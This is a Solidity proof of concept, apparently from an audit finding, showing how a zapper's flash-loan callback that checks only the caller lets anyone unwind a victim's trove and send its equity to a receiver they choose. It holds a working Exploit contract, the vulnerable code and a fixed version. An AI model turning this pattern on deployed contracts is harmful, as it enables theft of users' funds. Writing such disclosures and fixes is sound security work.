// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Bold — zapper flash-loan protection is only msg.sender (Recon, H-02)
    SYNTHETIC, cheatcode-free, one transaction.
    receiveFlashLoanOnLeverDownTrove checks the caller is the flash-loan
    provider and nothing else. Anyone can ask that provider to call the
    zapper, which then unwinds a victim trove and sends the 60 of equity
    to an attacker-chosen receiver. The fix also requires an operation id
    that only the zapper's own entrypoint sets. */

contract Coll {
    string public constant symbol = "COLL";
    uint8 public constant decimals = 0;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

struct LeverDownTroveParams {
    address troveOwner;
    address receiver;
}

interface ILever {
    function receiveFlashLoanOnLeverDownTrove(LeverDownTroveParams memory params, uint256 amount) external;
}

contract FlashLoanProvider {
    function flashLoan(address recipient, uint256 amount, bytes calldata userData) external {
        LeverDownTroveParams memory params = abi.decode(userData, (LeverDownTroveParams));
        ILever(recipient).receiveFlashLoanOnLeverDownTrove(params, amount);
    }
}

contract Trove {
    Coll public coll;
    mapping(address => uint256) public collateral;
    mapping(address => uint256) public debt;

    constructor(address c) {
        coll = Coll(c);
    }

    function open(address who, uint256 collateral_, uint256 debt_) external {
        collateral[who] = collateral_;
        debt[who] = debt_;
        coll.mint(address(this), collateral_);
    }

    function take(address who, address to) external returns (uint256 equity) {
        uint256 collateral_ = collateral[who];
        uint256 debt_ = debt[who];
        collateral[who] = 0;
        debt[who] = 0;
        equity = collateral_ - debt_;
        coll.transfer(to, equity);
    }
}

contract Zapper {
    FlashLoanProvider public flashLoanProvider;
    Trove public trove;
    uint256 public pulled;

    constructor(address flash, address trove_) {
        flashLoanProvider = FlashLoanProvider(flash);
        trove = Trove(trove_);
    }

    function receiveFlashLoanOnLeverDownTrove(LeverDownTroveParams memory _params, uint256 _effectiveFlashLoanAmount)
        external
    {
        require(msg.sender == address(flashLoanProvider), "LZ: Caller not FlashLoan provider");
        _effectiveFlashLoanAmount;
        // @> VULN: any flash loan can name the trove and the receiver; the zapper did not start this call
        pulled = trove.take(_params.troveOwner, _params.receiver);
    }
}

contract ZapperFixed {
    FlashLoanProvider public flashLoanProvider;
    Trove public trove;
    uint256 public operationId;
    uint256 public pulled;

    constructor(address flash, address trove_) {
        flashLoanProvider = FlashLoanProvider(flash);
        trove = Trove(trove_);
    }

    function leverDown(address troveOwner, address receiver) external {
        operationId = 1;
        bytes memory data = abi.encode(LeverDownTroveParams(troveOwner, receiver));
        flashLoanProvider.flashLoan(address(this), 40, data);
        operationId = 0;
    }

    function receiveFlashLoanOnLeverDownTrove(LeverDownTroveParams memory _params, uint256) external {
        require(msg.sender == address(flashLoanProvider), "LZ: Caller not FlashLoan provider");
        // FIX: only a callback started by leverDown is accepted
        require(operationId == 1, "callback was started by this contract");
        pulled = trove.take(_params.troveOwner, _params.receiver);
    }
}

contract Exploit {
    uint256 public constant EQUITY = 60;

    Coll public coll; // CREATE nonce 1
    Trove public trove; // CREATE nonce 2
    FlashLoanProvider public flash; // CREATE nonce 3
    Zapper public zapper; // CREATE nonce 4

    uint256 public taken;

    constructor() {
        coll = new Coll();
        trove = new Trove(address(coll));
        flash = new FlashLoanProvider();
        zapper = new Zapper(address(flash), address(trove));
        trove.open(address(0xBEEF), 100, 40);
    }

    function run() external {
        bytes memory data = abi.encode(LeverDownTroveParams(address(0xBEEF), msg.sender));
        flash.flashLoan(address(zapper), 40, data);
        taken = zapper.pulled();
        require(taken == EQUITY, "equity not extracted");
        require(coll.balanceOf(msg.sender) == EQUITY, "attacker was not paid");
        require(trove.collateral(address(0xBEEF)) == 0, "trove not unwound");
    }
}
